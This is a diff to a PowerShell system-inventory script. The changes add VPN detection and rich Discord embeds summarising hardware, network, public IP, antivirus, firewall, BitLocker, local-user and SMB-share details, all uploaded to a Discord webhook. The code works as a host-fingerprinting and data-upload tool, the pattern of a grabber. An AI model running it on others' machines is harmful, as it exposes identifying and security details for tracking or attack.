@@ -73,10 +73,252 @@ function Resolve-DiscordWebhook {
     return $null
 }
 
+function Build-DiscordPayload {
+    param([string]$FileName)
+
+    # ── Embed 1: Hardware & OS ────────────────────────────────────────────────
+    $e1 = [System.Collections.Generic.List[hashtable]]::new()
+
+    $basic = $jsonData["Basic"]
+    if ($basic) {
+        $e1.Add(@{ name = "User";               value = "$($basic.CurrentUser)";       inline = $true })
+        $e1.Add(@{ name = "Machine";            value = "$($basic.Machine)";           inline = $true })
+        $e1.Add(@{ name = "Domain";             value = "$($basic.Domain)";            inline = $true })
+        $e1.Add(@{ name = "PowerShell Version"; value = "$($basic.PowerShellVersion)"; inline = $true })
+    }
+
+    $osDevice = $jsonData["OSAndDevice"]
+    if ($osDevice) {
+        $e1.Add(@{ name = "OS";           value = "$($osDevice.OS)";           inline = $true })
+        $e1.Add(@{ name = "Build";        value = "$($osDevice.Build)";        inline = $true })
+        $e1.Add(@{ name = "Architecture"; value = "$($osDevice.Architecture)"; inline = $true })
+        $model = ("{0} {1}" -f $osDevice.Manufacturer, $osDevice.Model).Trim()
+        if ($model) { $e1.Add(@{ name = "Model"; value = $model; inline = $true }) }
+        $e1.Add(@{ name = "Last Boot"; value = "$($osDevice.LastBoot)"; inline = $true })
+        if ($osDevice.TimeZone)   { $e1.Add(@{ name = "Time Zone";   value = "$($osDevice.TimeZone)";   inline = $true }) }
+        if ($osDevice.SecureBoot -ne $null) { $e1.Add(@{ name = "Secure Boot"; value = "$($osDevice.SecureBoot)"; inline = $true }) }
+        if ($osDevice.BIOSVersion) { $e1.Add(@{ name = "BIOS Version"; value = "$($osDevice.BIOSVersion)"; inline = $true }) }
+        if ($osDevice.BIOSSerial)  { $e1.Add(@{ name = "BIOS Serial";  value = "$($osDevice.BIOSSerial)";  inline = $true }) }
+        if ($osDevice.TotalPhysicalMemoryBytes) {
+            $ramGb = [math]::Round($osDevice.TotalPhysicalMemoryBytes / 1GB, 1)
+            $e1.Add(@{ name = "Total RAM"; value = "${ramGb} GB"; inline = $true })
+        }
+    }
+
+    $cpuList = $jsonData["CPU"]
+    if ($cpuList) {
+        $cpu0 = if ($cpuList -is [array]) { $cpuList[0] } else { $cpuList }
+        if ($cpu0.Name)           { $e1.Add(@{ name = "CPU";            value = "$($cpu0.Name)";                                                   inline = $true }) }
+        if ($cpu0.NumberOfCores)  { $e1.Add(@{ name = "Cores / Threads"; value = "$($cpu0.NumberOfCores) / $($cpu0.NumberOfLogicalProcessors)";    inline = $true }) }
+        if ($cpu0.MaxClockSpeed)  { $e1.Add(@{ name = "Max Clock";      value = "$([math]::Round($cpu0.MaxClockSpeed / 1000, 2)) GHz";             inline = $true }) }
+    }
+
+    $ramList = $jsonData["RAM"]
+    if ($ramList) {
+        $ramArr = if ($ramList -is [array]) { $ramList } else { @($ramList) }
+        $stickCount  = $ramArr.Count
+        $firstSpeed  = $ramArr[0].ConfiguredClockSpeed
+        $stickSizes  = ($ramArr | ForEach-Object { "$([math]::Round($_.Capacity / 1GB, 0))GB" }) -join " + "
+        if ($stickCount -and $firstSpeed) {
+            $e1.Add(@{ name = "RAM Sticks";  value = "${stickCount}x @ ${firstSpeed} MHz ($stickSizes)"; inline = $true })
+        }
+        $ramMfrs = ($ramArr | Where-Object { $_.Manufacturer } | Select-Object -ExpandProperty Manufacturer -Unique) -join ", "
+        if ($ramMfrs) { $e1.Add(@{ name = "RAM Manufacturer"; value = $ramMfrs; inline = $true }) }
+    }
+
+    $gpuList = $jsonData["GPU"]
+    if ($gpuList) {
+        $gpuArr = if ($gpuList -is [array]) { $gpuList } else { @($gpuList) }
+        foreach ($gpu in $gpuArr) {
+            if ($gpu.Name) {
+                $vramStr = if ($gpu.AdapterRAM -and $gpu.AdapterRAM -gt 0) { " ($([math]::Round($gpu.AdapterRAM / 1GB, 1)) GB)" } else { "" }
+                $e1.Add(@{ name = "GPU"; value = "$($gpu.Name)$vramStr"; inline = $true })
+            }
+            if ($gpu.CurrentHorizontalResolution -and $gpu.CurrentVerticalResolution) {
+                $e1.Add(@{ name = "Resolution"; value = "$($gpu.CurrentHorizontalResolution) x $($gpu.CurrentVerticalResolution)"; inline = $true })
+            }
+        }
+    }
+
+    $storage = $jsonData["Storage"]
+    if ($storage -and $storage.PhysicalDisks) {
+        $disks = if ($storage.PhysicalDisks -is [array]) { $storage.PhysicalDisks } else { @($storage.PhysicalDisks) }
+        $e1.Add(@{ name = "Disk Count"; value = "$($disks.Count)"; inline = $true })
+        foreach ($d in $disks) {
+            if ($d.Model) {
+                $sizeGb  = if ($d.Size) { "$([math]::Round($d.Size / 1GB, 0)) GB" } else { "?" }
+                $iface   = if ($d.InterfaceType) { " [$($d.InterfaceType)]" } else { "" }
+                $e1.Add(@{ name = "Disk"; value = "$($d.Model) — $sizeGb$iface"; inline = $true })
+            }
+        }
+        if ($storage.LogicalDisks) {
+            $ldArr = if ($storage.LogicalDisks -is [array]) { $storage.LogicalDisks } else { @($storage.LogicalDisks) }
+            $ldSummary = ($ldArr | Where-Object { $_.Size -and $_.Size -gt 0 } | ForEach-Object {
+                "$($_.DeviceID) $([math]::Round($_.FreeSpace / 1GB, 0))/$([math]::Round($_.Size / 1GB, 0)) GB free"
+            }) -join "  |  "
+            if ($ldSummary) { $e1.Add(@{ name = "Logical Drives"; value = $ldSummary; inline = $false }) }
+        }
+    }
+
+    $hwExtras = $jsonData["HardwareExtras"]
+    if ($hwExtras -and $hwExtras.Monitors) {
+        $monArr = if ($hwExtras.Monitors -is [array]) { $hwExtras.Monitors } else { @($hwExtras.Monitors) }
+        $monSummary = ($monArr | Where-Object { $_.Name } | ForEach-Object {
+            $res = if ($_.ScreenWidth -and $_.ScreenHeight) { " ($($_.ScreenWidth)x$($_.ScreenHeight))" } else { "" }
+            "$($_.Name)$res"
+        }) -join "  |  "
+        if ($monSummary) { $e1.Add(@{ name = "Monitor(s)"; value = $monSummary; inline = $false }) }
+    }
+
+    # ── Embed 2: Network, Security & Summary ─────────────────────────────────
+    $e2 = [System.Collections.Generic.List[hashtable]]::new()
+
+    $network = $jsonData["Network"]
+    if ($network) {
+        if ($network.IPv4) {
+            $ipArr   = if ($network.IPv4 -is [array]) { $network.IPv4 } else { @($network.IPv4) }
+            $localIp = $ipArr | Where-Object { $_.IPAddress -and -not $_.IPAddress.StartsWith("127.") } | Select-Object -First 1
+            if ($localIp) { $e2.Add(@{ name = "Local IPv4"; value = "$($localIp.IPAddress) / $($localIp.PrefixLength)"; inline = $true }) }
+        }
+        if ($network.Adapters) {
+            $adpArr = if ($network.Adapters -is [array]) { $network.Adapters } else { @($network.Adapters) }
+            $activeAdp = $adpArr | Where-Object { $_.Status -eq "Up" } | Select-Object -First 1
+            if ($activeAdp) {
+                $e2.Add(@{ name = "Active Adapter"; value = "$($activeAdp.InterfaceDescription)"; inline = $true })
+                if ($activeAdp.MacAddress) { $e2.Add(@{ name = "MAC Address"; value = "$($activeAdp.MacAddress)"; inline = $true }) }
+                if ($activeAdp.LinkSpeed)  { $e2.Add(@{ name = "Link Speed";  value = "$($activeAdp.LinkSpeed)";  inline = $true }) }
+            }
+        }
+        if ($network.DNS) {
+            $dnsArr = if ($network.DNS -is [array]) { $network.DNS } else { @($network.DNS) }
+            $dnsServers = ($dnsArr | Where-Object { $_.ServerAddresses } | ForEach-Object { $_.ServerAddresses } | Select-Object -Unique -First 6) -join ", "
+            if ($dnsServers) { $e2.Add(@{ name = "DNS Servers"; value = $dnsServers; inline = $false }) }
+        }
+    }
+
+    $vpn = $jsonData["VPN"]
+    $vpnActive = $vpn -and $vpn.Status -eq "Active"
+    if ($vpn) {
+        $vpnStatusVal = $vpn.Status
+        if ($vpn.ActiveAdapters) {
+            $vpnActArr = if ($vpn.ActiveAdapters -is [array]) { $vpn.ActiveAdapters } else { @($vpn.ActiveAdapters) }
+            $vpnNames  = ($vpnActArr | Where-Object { $_.InterfaceDescription } | ForEach-Object { $_.InterfaceDescription }) -join ", "
+            if ($vpnNames) { $vpnStatusVal += " — $vpnNames" }
+        } elseif ($vpn.Processes) {
+            $vpnProcArr = if ($vpn.Processes -is [array]) { $vpn.Processes } else { @($vpn.Processes) }
+            $vpnProcNames = ($vpnProcArr | ForEach-Object { $_.Name } | Select-Object -Unique) -join ", "
+            if ($vpnProcNames) { $vpnStatusVal += " (process: $vpnProcNames)" }
+        }
+        $e2.Add(@{ name = "VPN"; value = $vpnStatusVal; inline = $false })
+        if ($vpnActive -and $vpn.SampleRoutes) {
+            $rtArr = if ($vpn.SampleRoutes -is [array]) { $vpn.SampleRoutes } else { @($vpn.SampleRoutes) }
+            $rtSample = ($rtArr | Select-Object -First 3 | ForEach-Object { "$($_.DestinationPrefix) via $($_.NextHop)" }) -join "  |  "
+            if ($rtSample) { $e2.Add(@{ name = "VPN Routes (sample)"; value = $rtSample; inline = $false }) }
+        }
+    }
+
+    $internet = $jsonData["Internet"]
+    if ($internet -and $internet.PublicIP -and $internet.PublicIP -ne "Unavailable") {
+        $ipNote = if ($vpnActive) { " ⚠ VPN may mask real IP" } else { "" }
+        $e2.Add(@{ name = "Public IP"; value = "$($internet.PublicIP)$ipNote"; inline = $true })
+    }
+
+    $security = $jsonData["Security"]
+    if ($security) {
+        if ($security.Defender) {
+            $av   = if ($security.Defender.AntivirusEnabled)             { "Yes" } else { "No" }
+            $rtp  = if ($security.Defender.RealTimeProtectionEnabled)    { "Yes" } else { "No" }
+            $tamp = if ($security.Defender.IsTamperProtected)            { "Yes" } else { "No" }
+            $e2.Add(@{ name = "Antivirus";          value = $av;   inline = $true })
+            $e2.Add(@{ name = "Real-Time Protect";  value = $rtp;  inline = $true })
+            $e2.Add(@{ name = "Tamper Protection";  value = $tamp; inline = $true })
+        }
+        if ($security.FirewallProfiles) {
+            $fwArr     = if ($security.FirewallProfiles -is [array]) { $security.FirewallProfiles } else { @($security.FirewallProfiles) }
+            $fwSummary = ($fwArr | ForEach-Object { "$($_.Name): $(if ($_.Enabled) { 'On' } else { 'Off' })" }) -join "  |  "
+            $e2.Add(@{ name = "Firewall"; value = $fwSummary; inline = $false })
+        }
+        if ($security.BitLocker) {
+            $blArr     = if ($security.BitLocker -is [array]) { $security.BitLocker } else { @($security.BitLocker) }
+            $blSummary = ($blArr | ForEach-Object { "$($_.MountPoint): $($_.ProtectionStatus)" }) -join "  |  "
+            $e2.Add(@{ name = "BitLocker"; value = $blSummary; inline = $false })
+        }
+        if ($security.TPM -and $security.TPM.TpmPresent -ne $null) {
+            $e2.Add(@{ name = "TPM"; value = "Present: $($security.TPM.TpmPresent)  Ready: $($security.TPM.TpmReady)"; inline = $true })
+        }
+    }
+
+    $localAccounts = $jsonData["LocalAccounts"]
+    if ($localAccounts) {
+        if ($localAccounts.Users) {
+            $uArr    = if ($localAccounts.Users -is [array]) { $localAccounts.Users } else { @($localAccounts.Users) }
+            $enabled = ($uArr | Where-Object { $_.Enabled }).Count
+            $e2.Add(@{ name = "Local Users"; value = "$($uArr.Count) total, $enabled enabled"; inline = $true })
+        }
+    }
+
+    $software = $jsonData["Software"]
+    if ($software) {
+        $e2.Add(@{ name = "Installed Apps"; value = "$($software.InstalledAppCount)"; inline = $true })
+        if ($software.HotFixes) {
+            $hfArr = if ($software.HotFixes -is [array]) { $software.HotFixes } else { @($software.HotFixes) }
+            $e2.Add(@{ name = "HotFixes Installed"; value = "$($hfArr.Count)"; inline = $true })
+        }
+    }
+
+    $startupSched = $jsonData["StartupAndScheduled"]
+    if ($startupSched -and $startupSched.Startup) {
+        $suArr = if ($startupSched.Startup -is [array]) { $startupSched.Startup } else { @($startupSched.Startup) }
+        $e2.Add(@{ name = "Startup Items"; value = "$($suArr.Count)"; inline = $true })
+    }
+
+    if ($hwExtras) {
+        if ($hwExtras.USB) {
+            $usbArr = if ($hwExtras.USB -is [array]) { $hwExtras.USB } else { @($hwExtras.USB) }
+            $e2.Add(@{ name = "USB Devices"; value = "$($usbArr.Count)"; inline = $true })
+        }
+        if ($hwExtras.Printers) {
+            $prArr = if ($hwExtras.Printers -is [array]) { $hwExtras.Printers } else { @($hwExtras.Printers) }
+            $e2.Add(@{ name = "Printers"; value = "$($prArr.Count)"; inline = $true })
+        }
+        if ($hwExtras.Shares) {
+            $shArr = if ($hwExtras.Shares -is [array]) { $hwExtras.Shares } else { @($hwExtras.Shares) }
+            $shNames = ($shArr | ForEach-Object { $_.Name }) -join ", "
+            if ($shNames) { $e2.Add(@{ name = "SMB Shares"; value = $shNames; inline = $true }) }
+        }
+    }
+
+    $eventSummary = $jsonData["EventSummary"]
+    if ($eventSummary) {
+        $sysErrCount = 0
+        $appErrCount = 0
+        if ($eventSummary.System)      { $sysErrCount = if ($eventSummary.System -is [array])      { $eventSummary.System.Count }      else { 1 } }
+        if ($eventSummary.Application) { $appErrCount = if ($eventSummary.Application -is [array]) { $eventSummary.Application.Count } else { 1 } }
+        $e2.Add(@{ name = "Events (7d)"; value = "System errors: $sysErrCount  |  App errors: $appErrCount"; inline = $false })
+    }
+
+    return @{
+        embeds = @(
+            @{
+                title     = "System Report: $env:COMPUTERNAME"
+                color     = 3447003
+                fields    = $e1.ToArray()
+                timestamp = (Get-Date -Format o)
+            },
+            @{
+                title  = "Network, Security & Summary"
+                color  = 15158332
+                fields = $e2.ToArray()
+                footer = @{ text = "Full data attached: $FileName" }
+            }
+        )
+    }
+}
+
 function Send-DiscordWebhookFiles {
     param(
         [string]$WebhookUrl,
-        [string]$Message,
+        [object]$Payload,
         [string[]]$FilePaths
     )
 
@@ -86,7 +328,7 @@ function Send-DiscordWebhookFiles {
     $multipart = New-Object System.Net.Http.MultipartFormDataContent
 
     try {
-        $payloadJson = @{ content = $Message } | ConvertTo-Json -Compress
+        $payloadJson = $Payload | ConvertTo-Json -Depth 5 -Compress
         $payloadContent = New-Object System.Net.Http.StringContent($payloadJson, [System.Text.Encoding]::UTF8, "application/json")
         $multipart.Add($payloadContent, "payload_json")
 
@@ -215,6 +457,62 @@ Try-Command {
     Add-Table "DNS Client" $dns
     Add-Table "Routes (Top 100)" $routes
     Set-JsonSection "Network" ([ordered]@{ Adapters = $adapters; IPv4 = $ip4; IPv6 = $ip6; DNS = $dns; Routes = $routes })
+}
+
+Try-Command {
+    Add-Section "VPN"
+
+    $vpnAdapterKeywords = @(
+        "vpn", "tap-windows", "tap adapter", "tun", "wireguard", "nordvpn", "expressvpn",
+        "protonvpn", "mullvad", "surfshark", "openvpn", "cisco anyconnect", "anyconnect",
+        "pulse secure", "globalprotect", "pangp", "fortinet", "sonicwall", "tailscale",
+        "l2tp", "pptp", "sstp", "ikev2", "ipsec tunnel"
+    )
+    $vpnProcessKeywords = @(
+        "nordvpn", "expressvpn", "protonvpn", "mullvad", "surfshark", "openvpn", "wireguard",
+        "tailscale", "vpnagent", "vpnui", "forticlient", "pangpa", "pangps", "dsaccessservice",
+        "pulsesecure", "pulse", "vpnclient", "vpngui", "wg"
+    )
+
+    $allAdapters = Get-NetAdapter -ErrorAction SilentlyContinue
+    $vpnAdapters = $allAdapters | Where-Object {
+        $n = $_.Name.ToLower(); $d = $_.InterfaceDescription.ToLower()
+        ($vpnAdapterKeywords | Where-Object { $n -like "*$_*" -or $d -like "*$_*" }).Count -gt 0
+    } | Select-Object Name, InterfaceDescription, Status, MacAddress
+
+    $vpnProcs = Get-Process -ErrorAction SilentlyContinue | Where-Object {
+        $p = $_.Name.ToLower()
+        ($vpnProcessKeywords | Where-Object { $p -like "*$_*" }).Count -gt 0
+    } | Select-Object Name, Id, CPU, WorkingSet
+
+    # Any /32 host routes injected via a non-loopback, non-default gateway — common VPN tunnel pattern
+    $vpnRoutes = Get-NetRoute -ErrorAction SilentlyContinue |
+        Where-Object { $_.DestinationPrefix -match "/32$" -and $_.NextHop -notin @("0.0.0.0","") } |
+        Select-Object -First 15 DestinationPrefix, NextHop, InterfaceAlias
+
+    $activeVpnAdapters = @($vpnAdapters | Where-Object { $_.Status -eq "Up" })
+    $vpnStatus = if ($activeVpnAdapters.Count -gt 0) {
+        "Active"
+    } elseif ($vpnAdapters) {
+        "Adapter Present (Down)"
+    } elseif ($vpnProcs) {
+        "Client Running (no tunnel adapter)"
+    } else {
+        "Not Detected"
+    }
+
+    Add-Line "VPNStatus" $vpnStatus
+    Add-Table "VPN Adapters" $vpnAdapters
+    Add-Table "VPN Processes" $vpnProcs
+    Add-Table "VPN-style Routes (sample)" $vpnRoutes
+
+    Set-JsonSection "VPN" ([ordered]@{
+        Status          = $vpnStatus
+        Adapters        = $vpnAdapters
+        ActiveAdapters  = $activeVpnAdapters
+        Processes       = $vpnProcs
+        SampleRoutes    = $vpnRoutes
+    })
 }
 
 Try-Command {
@@ -415,8 +713,8 @@ Try-Command {
             throw "Reports are larger than Discord upload limits."
         }
 
-        $msg = "System report from $env:COMPUTERNAME at $(Get-Date -Format o)"
-        Send-DiscordWebhookFiles -WebhookUrl $webhookUrl -Message $msg -FilePaths @($uploadTarget)
+        $payload = Build-DiscordPayload -FileName ([System.IO.Path]::GetFileName($uploadTarget))
+        Send-DiscordWebhookFiles -WebhookUrl $webhookUrl -Payload $payload -FilePaths @($uploadTarget)
         Add-Line "UploadStatus" "Success"
         Add-Line "UploadedFile" ([System.IO.Path]::GetFileName($uploadTarget))
         Set-JsonSection "DiscordUpload" ([ordered]@{ Enabled = $true; Status = "Success"; UploadedFile = [System.IO.Path]::GetFileName($uploadTarget) })
